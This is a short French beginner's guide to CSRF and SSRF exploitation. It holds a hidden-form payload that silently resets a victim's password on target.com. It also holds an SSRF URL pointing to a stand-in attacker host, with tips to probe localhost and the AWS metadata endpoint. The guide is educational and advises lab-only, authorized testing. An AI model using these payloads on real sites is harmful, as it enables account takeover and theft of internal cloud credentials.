# CSRF & SSRF (Cross-Site Request Forgery & Server-Side Request Forgery)

## Objectif
Comprendre et exploiter deux types de failles : CSRF (forcer un utilisateur à exécuter une action) et SSRF (forcer le serveur à faire une requête).

---

## Commandes essentielles et explications

### 1. CSRF (Cross-Site Request Forgery)
- Exemple de payload HTML :
```
<form action="http://target.com/change-password" method="POST">
  <input type="hidden" name="password" value="hacked" />
  <input type="submit" value="Submit" />
</form>
```
- **À quoi ça sert ?** Si un utilisateur connecté visite cette page, son mot de passe sera changé à son insu.
- **Astuce débutant** : Tester sur des actions sensibles (changement de mail, suppression de compte, etc.).

### 2. SSRF (Server-Side Request Forgery)
- Exemple de payload dans un paramètre d’URL :
```
http://target.com/page.php?url=http://attacker.com
```
- **À quoi ça sert ?** Si le serveur fait une requête vers l’URL fournie, il est vulnérable à la SSRF.
- **Astuce** : Tester avec des IP internes (127.0.0.1, 169.254.169.254 pour AWS metadata).

### 3. Utilisation d’outils automatisés
- Pour CSRF : Utiliser Burp Suite pour générer des PoC CSRF.
- Pour SSRF : Utiliser ffuf ou wfuzz pour tester des URLs internes.

---

## Conseils pour débutants
- Toujours tester d’abord en manuel, puis automatiser avec des outils.
- Ne pas négliger les protections (tokens CSRF, filtrage d’URL côté serveur).
- Tester sur des environnements de lab, jamais en production sans autorisation.
- Lire la documentation de chaque outil pour découvrir des options avancées.

---

## Pour aller plus loin
- [PayloadsAllTheThings - CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF)
- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF)
- [OWASP CSRF](https://owasp.org/www-community/attacks/csrf)
- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) 